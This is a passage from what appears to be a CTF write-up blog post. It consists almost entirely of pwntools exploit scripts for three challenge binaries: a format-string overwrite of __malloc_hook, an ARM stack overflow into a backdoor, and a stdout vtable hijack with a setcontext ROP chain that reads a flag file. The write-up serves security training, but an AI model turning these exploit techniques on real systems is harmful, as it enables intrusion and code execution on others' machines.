class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">io=process(&#x27;./pwn&#x27;)</span><br><span class="line">#io=remote(&#x27;127.0.0.1&#x27;,9999) </span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;) </span><br><span class="line">libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">def printf_chk(content): </span><br><span class="line">    io.recvuntil(&#x27;2.printf\n&#x27;) </span><br><span class="line">    io.sendline(&#x27;1&#x27;) </span><br><span class="line">    io.recvuntil(&#x27;behind\n&#x27;) </span><br><span class="line">    io.sendline(content)</span><br><span class="line">def printf(content):</span><br><span class="line">    io.sendline(&#x27;2&#x27;)</span><br><span class="line">    io.sendline(content)</span><br><span class="line">printf_chk(&#x27;%a%a&#x27;)</span><br><span class="line">io.recvuntil(&#x27;10220x0.0&#x27;)</span><br><span class="line">stdin_addr=b&#x27;0x&#x27;+io.recv(10)+b&#x27;00&#x27;</span><br><span class="line">io.recv()</span><br><span class="line">stdin_addr=int(stdin_addr,16)</span><br><span class="line">log.success(&#x27;stdin_addr =&gt; &#123;&#125;&#x27;.format(hex(stdin_addr)))</span><br><span class="line">libc_base=stdin_addr-0x3eba00</span><br><span class="line">log.success(&#x27;libc_base =&gt;&#123;&#125;&#x27;.format(hex(libc_base)))</span><br><span class="line">onegadget = libc_base+0x4f322</span><br><span class="line">malloc_hook=libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">log.success(&#x27;onegadget =&gt; &#123;&#125;&#x27;.format(hex(onegadget)))</span><br><span class="line">log.success(&#x27;malloc_hook =&gt; &#123;&#125;&#x27;.format(hex(malloc_hook)))</span><br><span class="line">write_size=0</span><br><span class="line">offset=18</span><br><span class="line">payload=b&#x27;&#x27;</span><br><span class="line">for i in range(6): </span><br><span class="line">    num=(onegadget&gt;&gt;(8*i))&amp;0xff </span><br><span class="line">    print(&quot;num:&quot;+str(num))</span><br><span class="line">    print(&quot;hex:&quot;+hex(num))</span><br><span class="line">    if num&gt;write_size&amp;0xff: </span><br><span class="line">        payload+=(&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;.format(num-(write_size&amp;0xff),offset+i)).encode()</span><br><span class="line">        write_size+=num-(write_size&amp;0xff)</span><br><span class="line">    else:</span><br><span class="line">        payload+=(&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;.format((0x100-(write_size&amp;0xff))+num,offset+i)).encode()</span><br><span class="line">        write_size+=(0x100-(write_size&amp;0xff))+num</span><br><span class="line">payload+=b&#x27;%99999c&#x27;</span><br><span class="line">print(&quot;write:&quot;+str((write_size)))</span><br><span class="line">print(&quot;write hex:&quot;+hex(write_size))</span><br><span class="line">payload=payload.ljust(0x50,b&#x27;a&#x27;)</span><br><span class="line">for i in range(6):</span><br><span class="line">    payload+=p64(malloc_hook+i)</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendline(&#x27;2&#x27;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendline(&#x27;exec 1&gt;&amp;2&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="xiaoming"><a href="#xiaoming" class="headerlink" title="xiaoming"></a>xiaoming</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        sh=process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf/&#x27;</span>,<span class="string">&#x27;./xiaoming&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh=process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf/&#x27;</span>,<span class="string">&#x27;./xiaoming&#x27;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh=remote(<span class="string">&quot;101.33.221.104&quot;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#0x79</span></span><br><span class="line"><span class="comment">#0xe</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">libc_base=<span class="number">0xff6bb000</span></span><br><span class="line"><span class="comment">#libc_base=0xff6c8000</span></span><br><span class="line"><span class="comment"># libc_base=0xff6d0000</span></span><br><span class="line"><span class="comment"># libc_base=0xff6b6000</span></span><br><span class="line"><span class="comment"># gadget=0x00056b7c+libc_base</span></span><br><span class="line">gadget=<span class="number">0x00010984</span></span><br><span class="line"><span class="comment"># 0x00010984 : pop &#123;r1, r2, r4, r5, r6, r7, r8, ip, lr, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x00056b7c : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x0002e738 : pop &#123;r0, r1, r2, ip, sp, pc&#125;</span></span><br><span class="line">binsh=libc_base+<span class="number">0xCA574</span></span><br><span class="line">system=<span class="number">0x10558</span></span><br><span class="line">execve=libc_base+<span class="number">0x70160</span></span><br><span class="line"></span><br><span class="line">puts_got=<span class="number">0x2101C</span></span><br><span class="line">read=<span class="number">0x10510</span></span><br><span class="line">binsh=<span class="number">0x10AB0</span></span><br><span class="line">backdoor=<span class="number">0x000108A4</span></span><br><span class="line">sla(<span class="string">&quot;len&gt; &quot;</span>,<span class="string">&quot;224&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x54</span></span><br><span class="line">payload+=p32(<span class="number">0x22000</span>)*<span class="number">2</span></span><br><span class="line">payload+=p32(backdoor+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload+=p32(binsh)+p32(<span class="number">0x108ad</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;plain&gt; &quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x2b</span>^<span class="number">0x52</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x9</span>^<span class="number">0x7</span>)</span><br><span class="line">ti()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="weirdheap"><a href="#weirdheap" class="headerlink" title="weirdheap"></a>weirdheap</h2><p>参考了wp，非常规orw</p>
<p>劫持stdout的vtable为helper_jump，劫持overflow为gadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./weirdheap&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;127.0.0.1&#x27;,9999) </span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./weirdheap&#x27;</span>) </span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Ur choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Stuff: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>): <span class="comment">#only one</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Ur choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Stuff: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Ur choice: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Ur choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Ur choice: &#x27;</span>,<span class="string">&#x27;299&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Stuff: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    add(i,<span class="number">0x200</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1e1744</span></span><br><span class="line">_IO_helper_jumps=libc_base+<span class="number">0x1e1960</span></span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">ret=libc_base+<span class="number">0x0000000000026699</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000028a55</span>+libc_base</span><br><span class="line">pop_rax_ret=<span class="number">0x0000000000044c70</span>+libc_base</span><br><span class="line">pop_rsi_ret=<span class="number">0x000000000002a4cf</span>+libc_base</span><br><span class="line">pop_rdx_ret=<span class="number">0x00000000000c7f32</span>+libc_base</span><br><span class="line">syscall_ret=<span class="number">0x000000000006105a</span>+libc_base</span><br><span class="line">gadget=<span class="number">0x000000000014d09a</span>+libc_base</span><br><span class="line">pop_rcx_rbx_ret=<span class="number">0x00000000000fc104</span>+libc_base</span><br><span class="line">ret=<span class="number">0x52acf</span>+libc_base</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">rdx=IO_helper_jumps</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">asm </span></span><br><span class="line"><span class="string">0x7ffff7f1309a &lt;svcudp_reply+26&gt;: mov rbp,QWORD PTR [rdi+0x48] </span></span><br><span class="line"><span class="string">0x7ffff7f1309e &lt;svcudp_reply+30&gt;: mov rax,QWORD PTR [rbp+0x18] </span></span><br><span class="line"><span class="string">0x7ffff7f130a2 &lt;svcudp_reply+34&gt;: lea r13,[rbp+0x10] </span></span><br><span class="line"><span class="string">0x7ffff7f130a6 &lt;svcudp_reply+38&gt;: mov DWORD PTR [rbp+0x10],0x0 </span></span><br><span class="line"><span class="string">0x7ffff7f130ad &lt;svcudp_reply+45&gt;: mov rdi,r13 </span></span><br><span class="line"><span class="string">0x7ffff7f130b0 &lt;svcudp_reply+48&gt;: call QWORD PTR [rax+0x28]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">flag_addr=<span class="number">0x290</span>+libc_base+libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">orw_addr=<span class="number">0x100</span>+libc_base+libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]-<span class="number">0x10</span>-<span class="number">0x10</span></span><br><span class="line">orw=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">0xffffff9c</span>)</span><br><span class="line">orw+=p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">orw+=p64(pop_rax_ret)+p64(<span class="number">0x101</span>)</span><br><span class="line">orw+=p64(pop_rdx_ret)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(syscall_ret)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">2</span>)</span><br><span class="line">orw+=p64(pop_rsi_ret)+p64(_IO_helper_jumps-<span class="number">0x98</span>)</span><br><span class="line">orw+=p64(pop_rdx_ret)+p64(<span class="number">1</span>)</span><br><span class="line">orw+=p64(pop_rcx_rbx_ret)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">orw+=p64(pop_rax_ret)+p64(<span class="number">0x127</span>)</span><br><span class="line">orw+=p64(syscall_ret)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">orw+=p64(pop_rsi_ret)+p64(_IO_helper_jumps-<span class="number">0x98</span>)</span><br><span class="line">orw+=p64(pop_rdx_ret)+p64(<span class="number">1</span>)</span><br><span class="line">orw+=p64(pop_rax_ret)+p64(<span class="number">0x14</span>)</span><br><span class="line">orw+=p64(syscall_ret)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000014a0a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget2=<span class="number">0x000000000014a0a0</span>+libc_base</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="built_in">hex</span>(gadget2))</span><br><span class="line">success(<span class="built_in">hex</span>(setcontext))</span><br><span class="line"><span class="comment">#rdi=libc_base+libc.sym[&#x27;_IO_2_1_stdout_&#x27;]</span></span><br><span class="line">payload=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc_base+libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0x1e0</span>) <span class="comment">#rdx</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(libc_base+<span class="number">0x1e3670</span>)<span class="comment">#lock</span></span><br><span class="line">payload=payload.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(free_hook)   <span class="comment">#_IO_wide_data_1</span></span><br><span class="line">payload=payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(_IO_helper_jumps)<span class="comment">#vtable</span></span><br><span class="line"><span class="comment">#payload+=p64(0)+p64(0) # stderr stdout</span></span><br><span class="line">payload+=orw </span><br><span class="line">payload=payload.ljust(<span class="number">0x1e0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(setcontext)  <span class="comment">#call qword ptr [rdx + 0x20]</span></span><br><span class="line">payload+=p64(free_hook)+p64(<span class="number">0x50</span>)  <span class="comment">#struct iovec &#123;buf,len&#125;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x1e0</span>+<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(orw_addr)+p64(ret)<span class="comment"># rsp rip</span></span><br><span class="line">payload+=<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x2a0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc_base+<span class="number">0x83680</span>)+p64(gadget2)<span class="comment"># helper-&gt;overflow</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">exit(-<span class="number">8</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>






        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>7r1p13J</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/CTF/"># CTF</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/09/19/hello-world/">Hello World</a>
            
            
            <a class="next" rel="next" href="/2022/06/15/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/">2022广东省赛</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© 7r1p13J | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>